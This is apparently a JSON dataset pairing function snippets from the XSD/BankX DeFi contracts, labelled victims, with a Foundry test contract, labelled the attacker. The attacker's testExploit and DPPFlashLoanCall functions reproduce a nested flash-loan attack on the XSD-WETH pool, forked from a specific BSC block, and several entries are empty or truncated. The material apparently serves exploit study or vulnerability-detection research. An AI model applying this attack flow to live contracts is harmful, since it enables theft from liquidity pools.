[
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "burnpoolXSD",
    "original_code": "    function burnpoolXSD(uint _xsdamount) public {\n        //uXSD = totalSupply - collat_XSD\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IXSD",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "PERMIT_TYPEHASH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "collatDollarBalance",
    "original_code": "    function collatDollarBalance() public view override returns (uint256) {\n            return ((IERC20(WETHaddress).balanceOf(address(this))*(XSD.eth_usd_price()))/(PRICE_PRECISION));     \n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "getReserves",
    "original_code": "    function getReserves() public override view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "kLast",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "nonces",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "price0CumulativeLast",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "price1CumulativeLast",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "skim",
    "original_code": "    function skim(address to) external override nonReentrant {\n        address _token0 = XSDaddress; // gas savings\n        address _token1 = WETHaddress; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this))-(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this))-(reserve1));\n    }\n\n    // force reserves to match balances\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to) external override nonReentrant {\n        require(amount0Out > 0 || amount1Out > 0, 'XSDWETH: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        _reserve0 = uint112(_reserve0);\n        _reserve1 = uint112(_reserve1);\n        require(amount0Out < (_reserve0-reserve0_residue) && amount1Out < (_reserve1-reserve1_residue), 'XSDWETH: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = XSDaddress;\n        address _token1 = WETHaddress;\n        require(to != _token0 && to != _token1, 'XSDWETH: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'XSDWETH: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = balance0;\n        uint balance1Adjusted = balance1;\n        require(balance0Adjusted*(balance1Adjusted) >= uint(_reserve0)*(_reserve1), 'XSDWETH: K');\n        }\n        if(amount1Out != 0) xsdamount = amount0In;\n        _update(balance0, balance1,_reserve0,_reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDWETHpool",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "    function sync() external override nonReentrant {\n        _update(IERC20(XSDaddress).balanceOf(address(this)), IERC20(WETHaddress).balanceOf(address(this)), reserve0, reserve1);\n        kLast = uint(reserve0)*(reserve1);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {\n        if (abi.decode(data, (uint256)) == baseAmount) {\n            DPPAdvance.flashLoan(moreAmount, 0, address(this), abi.encode(moreAmount));\n            WBNB.transfer(address(DPPOracle), baseAmount);\n        } else {\n            uint256 amountOut = 9_840_000_000_000_000_000;\n            Router.swapXSDForETH(amountOut, XSD.balanceOf(address(this)));\n            XSD.transfer(address(XSDWETHpool), swapAmount);\n            XSDWETHpool.swap(0, attackAmount + exploitAmount, address(this));\n            WBNB.transfer(address(DPPAdvance), moreAmount);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 32_086_901 - 1);\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(DPPOracle), \"DPPOracle\");\n        vm.label(address(DPPAdvance), \"DPPAdvance\");\n        vm.label(address(XSD), \"XSD\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(XSDWETHpool), \"XSDWETHpool\");\n        vm.label(address(PIDController), \"PIDController\");\n        deal(address(XSD), address(this), 39_566_238_265_722_260_955_438);\n        approveAll();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        uint256 startBNB = WBNB.balanceOf(address(this));\n        console.log(\"Before Start: %d BNB\", startBNB);\n\n        DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encode(baseAmount));\n\n        uint256 intRes = WBNB.balanceOf(address(this)) / 1 ether;\n        uint256 decRes = WBNB.balanceOf(address(this)) - intRes * 1e18;\n        console.log(\"Attack Exploit: %s.%s BNB\", intRes, decRes);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDRouter",
    "source_type": "victim_contract",
    "function_name": "swapETHForBankX",
    "original_code": "    function swapETHForBankX(uint amountOut)\n        external\n        override\n        payable\n    {\n        require(!swap_paused, \"Swaps have been paused\");\n        (uint reserveA, uint reserveB, ) = IBankXWETHpool(BankXWETH_pool_address).getReserves();\n        uint amounts = BankXLibrary.quote(msg.value, reserveB, reserveA);\n        require(amounts >= amountOut, 'BankXRouter: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWBNB(WETH).deposit{value: msg.value}();\n        assert(IWBNB(WETH).transfer(BankXWETH_pool_address, msg.value));\n        IBankXWETHpool(BankXWETH_pool_address).swap(amountOut, 0, msg.sender);\n        refreshPID();\n    }\n    //approve the router to access users bankx\n    //if bankx is inflationary burn 10% of tokens swapped into pool\n",
    "description": ""
  },
  {
    "contract/interface": "IXSDRouter",
    "source_type": "victim_contract",
    "function_name": "swapXSDForETH",
    "original_code": "    function swapXSDForETH(uint amountOut, uint amountInMax)\n        external\n        override\n    {\n        require(!swap_paused, \"Swaps have been paused\");\n        (uint reserveA, uint reserveB, ) = IXSDWETHpool(XSDWETH_pool_address).getReserves();\n        uint amounts = BankXLibrary.quote(amountOut, reserveB, reserveA);\n        require(amounts <= amountInMax, 'BankXRouter: EXCESSIVE_INPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            xsd_address, msg.sender, XSDWETH_pool_address, amountInMax\n        );\n        XSDWETHpool(XSDWETH_pool_address).swap(0, amountOut, address(this));\n",
    "description": ""
  },
  {
    "contract/interface": "IPIDController",
    "source_type": "victim_contract",
    "function_name": "systemCalculations",
    "original_code": "    function systemCalculations() public {\n    \trequire(collateral_ratio_paused == false, \"Collateral Ratio has been paused\");\n        uint256 time_elapsed = block.timestamp - last_update;\n        require(time_elapsed >= internal_cooldown, \"internal cooldown not passed\");\n        uint256 bankx_reserves = BankX.balanceOf(bankxwethpool_address);\n        uint256 bankx_price = XSD.bankx_price();\n        \n        uint256 bankx_liquidity = bankx_reserves*bankx_price; // Has 6 decimals of precision\n\n        uint256 xsd_supply = XSD.totalSupply();\n        \n        // Get the XSD price\n        uint256 xsd_price = XSD.xsd_price();\n\n        uint256 new_growth_ratio = (bankx_liquidity/(xsd_supply-collateralpool.collat_XSD())); // (E18 + E6) / E18\n\n        uint256 last_collateral_ratio = XSD.global_collateral_ratio();\n        uint256 new_collateral_ratio = last_collateral_ratio;\n        uint256 silver_price = (XSD.xag_usd_price()*(1e4))/(311035); //31.1034768\n        uint256 XSD_top_band = silver_price + (xsd_percent*silver_price)/100;\n        uint256 XSD_bottom_band = silver_price - (xsd_percent*silver_price)/100;\n        xsd_burnable_limit = approximateXSD();\n        // make the top band and bottom band a percentage of silver price.\n\n        if(FIP_6){\n            require(xsd_price > XSD_top_band || xsd_price < XSD_bottom_band, \"Use PIDController when XSD is outside of peg\");\n        }\n\n        if((NFT_timestamp == 0) || ((block.timestamp - NFT_timestamp)>43200)){\n            BankXInterface(BankXNFT_address).updateTVLReached();\n            NFT_timestamp = block.timestamp;\n        }\n\n        // First, check if the price is out of the band\n        if(xsd_price > XSD_top_band){\n            new_collateral_ratio = last_collateral_ratio - xsd_step;\n            maxArbBurnAbove = aboveThePeg();\n        } else if (xsd_price < XSD_bottom_band){\n            new_collateral_ratio = last_collateral_ratio + xsd_step;\n            minArbBurnBelow = belowThePeg();\n\n        // Else, check if the growth ratio has increased or decreased since last update\n        } else if(use_growth_ratio){\n            if(new_growth_ratio > ((growth_ratio*(1e6 + GR_top_band))/1e6)){\n                new_collateral_ratio = last_collateral_ratio - xsd_step;\n            } else if (new_growth_ratio < (growth_ratio*(1e6 - GR_bottom_band)/1e6)){\n                new_collateral_ratio = last_collateral_ratio + xsd_step;\n            }\n        }\n\n        growth_ratio = new_growth_ratio;\n        last_update = block.timestamp;\n\n        // No need for checking CR under 0 as the last_collateral_ratio.sub(xsd_step) will throw \n        // an error above in that case\n        if(new_collateral_ratio > 1e6){\n            new_collateral_ratio = 1e6;\n        }\n        incentiveChecker1();\n        incentiveChecker2();\n        incentiveChecker3();\n//check what this part does\n        if(is_active){\n            uint256 delta_collateral_ratio;\n            if(new_collateral_ratio > last_collateral_ratio){\n                delta_collateral_ratio = new_collateral_ratio - last_collateral_ratio;\n                XSD.setPriceTarget(1000e6); // Set to high value to decrease CR\n                emit XSDdecollateralize(new_collateral_ratio);\n            } else if (new_collateral_ratio < last_collateral_ratio){\n                delta_collateral_ratio = last_collateral_ratio - new_collateral_ratio;\n                XSD.setPriceTarget(0); // Set to zero to increase CR\n                emit XSDrecollateralize(new_collateral_ratio);\n            }\n\n            XSD.setXSDStep(delta_collateral_ratio); // Change by the delta\n            uint256 cooldown_before = XSD.refresh_cooldown(); // Note the existing cooldown period\n            XSD.setRefreshCooldown(0); // Unlock the CR cooldown\n            //refresh interest rate.\n            XSD.refreshCollateralRatio(); // Refresh CR\n\n            // Reset params\n            XSD.setXSDStep(0);\n            XSD.setRefreshCooldown(cooldown_before); // Set the cooldown period to what it was before, or until next controller refresh\n            //change price target to that of one ounce/gram of silver.\n            XSD.setPriceTarget((XSD.xag_usd_price()*(1e4))/(311035));           \n        }\n    }\n\n    //checks the XSD liquidity pool for a deficit.\n    //bucket and difference variables should return values only if changed.\n    // difference is calculated only every week.\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  }
]